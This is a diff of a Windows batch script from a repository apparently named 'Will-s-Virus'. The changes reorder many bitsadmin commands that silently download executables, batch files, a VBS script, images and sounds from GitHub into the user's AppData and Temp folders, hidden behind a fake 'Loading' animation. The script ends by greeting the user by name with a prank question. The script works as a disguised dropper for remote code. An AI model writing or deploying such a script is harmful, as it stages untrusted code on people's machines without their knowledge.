@@ -11,60 +11,93 @@ ping localhost -n 1 >nul
 cls
 echo Loading.
 if not exist "%appdata%\willishot\willishot1.png" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/willishot1.png" "%appdata%\willishot\willishot1.png" >nul
-if not exist "%appdata%\willishot\windows.jpg" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/windows.jpg" "%appdata%\willishot\windows.jpg" >nul
 ping localhost -n 1 >nul
 cls
 echo Loading..
-if not exist "%appdata%\willishot\cmdmenusel.exe" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/cmdmenusel.exe" "%appdata%\willishot\cmdmenusel.exe" >nul
-if not exist "%appdata%\willishot\2choise.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/2choise.bat" "%appdata%\willishot\2choise.bat" >nul
+if not exist "%appdata%\willishot\windows.jpg" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/windows.jpg" "%appdata%\willishot\windows.jpg" >nul
 ping localhost -n 1 >nul
 cls
 echo Loading...
+if not exist "%appdata%\willishot\cmdmenusel.exe" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/cmdmenusel.exe" "%appdata%\willishot\cmdmenusel.exe" >nul
+ping localhost -n 1 >nul
+cls
+echo Loading.
+if not exist "%appdata%\willishot\2choise.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/2choise.bat" "%appdata%\willishot\2choise.bat" >nul
+ping localhost -n 1 >nul
+cls
+echo Loading..
 if not exist "%appdata%\willishot\Messagebox.vbs" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/Messagebox.vbs" "%appdata%\willishot\Messagebox.vbs" >nul
+ping localhost -n 1 >nul
+cls
+echo Loading...
 if not exist "%appdata%\willishot\batstart.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/batstart.bat" "%appdata%\willishot\batstart.bat" >nul
+ping localhost -n 1 >nul
+cls
+echo Loading.
 if not exist "%appdata%\Willisvirus2.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/Willisvirus2.bat" "%appdata%\willishot\Willisvirus2.bat" >nul
 ping localhost -n 1 >nul
 cls
-echo Loading.
-if not exist "%appdata%\willishot\wallpaper.png" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/wallpaper.png" "%appdata%\willishot\wallpaper.png" >nul
-if not exist "%appdata%\willishot\windows.jpg" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/windows.jpg" "%appdata%\willishot\windows.jpg" >nul
-if not exist "%appdata%\willishot\2choise.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/2choise.bat" "%appdata%\willishot\2choise.bat" >nul
-ping localhost -n 1 >nul
-cls
 echo Loading..
-if not exist "%temp%\bruh.mp3" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/Bruh_Sound_Effect.mp3" "%temp%\bruh.mp3" >nul
-if not exist "%appdata%\willishot\notif.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/notif.bat" "%appdata%\willishot\notif.bat" >nul
+if not exist "%appdata%\willishot\wallpaper.png" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/wallpaper.png" "%appdata%\willishot\wallpaper.png" >nul
 ping localhost -n 1 >nul
 cls
 echo Loading...
-if not exist "%temp%\fnaf.mp3" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/fnaf.mp3" "%temp%\fnaf.mp3" >nul
+if not exist "%appdata%\willishot\windows.jpg" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/windows.jpg" "%appdata%\willishot\windows.jpg" >nul
 ping localhost -n 1 >nul
 cls
 echo Loading.
-if not exist "%temp%\vine.mp3" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/vine.mp3" "%temp%\vine.mp3" >nul
-if not exist "%temp%\thanks.wav" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/thanks.wav" "%temp%\thanks.wav" >nul
+if not exist "%appdata%\willishot\2choise.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/2choise.bat" "%appdata%\willishot\2choise.bat" >nul
+ping localhost -n 1 >nul
+cls
+echo Loading...
+if not exist "%temp%\bruh.mp3" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/Bruh_Sound_Effect.mp3" "%temp%\bruh.mp3" >nul
+ping localhost -n 1 >nul
+cls
+echo Loading...
+if not exist "%appdata%\willishot\notif.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/notif.bat" "%appdata%\willishot\notif.bat" >nul
+ping localhost -n 1 >nul
+cls
+echo Loading.
+if not exist "%temp%\fnaf.mp3" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/fnaf.mp3" "%temp%\fnaf.mp3" >nul
 ping localhost -n 1 >nul
 cls
 echo Loading..
+if not exist "%temp%\vine.mp3" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/vine.mp3" "%temp%\vine.mp3" >nul
+ping localhost -n 1 >nul
+cls
+echo Loading...
+if not exist "%temp%\thanks.wav" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/thanks.wav" "%temp%\thanks.wav" >nul
+ping localhost -n 1 >nul
+cls
+echo Loading.
 if not exist "%temp%\creepy.mp3" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/creepy.mp3" "%temp%\creepy.mp3" >nul
+ping localhost -n 1 >nul
+cls
+echo Loading..
 if not exist "%temp%\wouldyousay.wav" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/wouldyousay.wav" "%temp%\wouldyousay.wav" >nul
 ping localhost -n 1 >nul
 cls
 echo Loading...
 if not exist "%temp%\creepy2.mp3" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/creepy2.mp3" "%temp%\creepy2.mp3" >nul
-if not exist "%temp%\again.wav" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/again.wav" "%temp%\again.wav" >nul
 ping localhost -n 1 >nul
 cls
 echo Loading.
-if not exist "%temp%\goodjob.wav" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/goodjob.wav" "%temp%\goodjob.wav" >nul
-if not exist "%temp%\tryagain.wav" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/tryagain.wav" "%temp%\tryagain.wav" >nul
+if not exist "%temp%\again.wav" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/again.wav" "%temp%\again.wav" >nul
 ping localhost -n 1 >nul
 cls
 echo Loading..
-if not exist "%temp%\areyousure.mp3" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/areyousure.mp3" "%temp%\areyousure.mp3" >nul
+if not exist "%temp%\goodjob.wav" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/goodjob.wav" "%temp%\goodjob.wav" >nul
 ping localhost -n 1 >nul
 cls
 echo Loading...
+if not exist "%temp%\tryagain.wav" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/tryagain.wav" "%temp%\tryagain.wav" >nul
+ping localhost -n 1 >nul
+cls
+echo Loading.
+if not exist "%temp%\areyousure.mp3" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/areyousure.mp3" "%temp%\areyousure.mp3" >nul
+ping localhost -n 1 >nul
+cls
+echo Loading..
 cls
 echo.
 echo Hey %USERNAME%, Is Will a big sexy man?
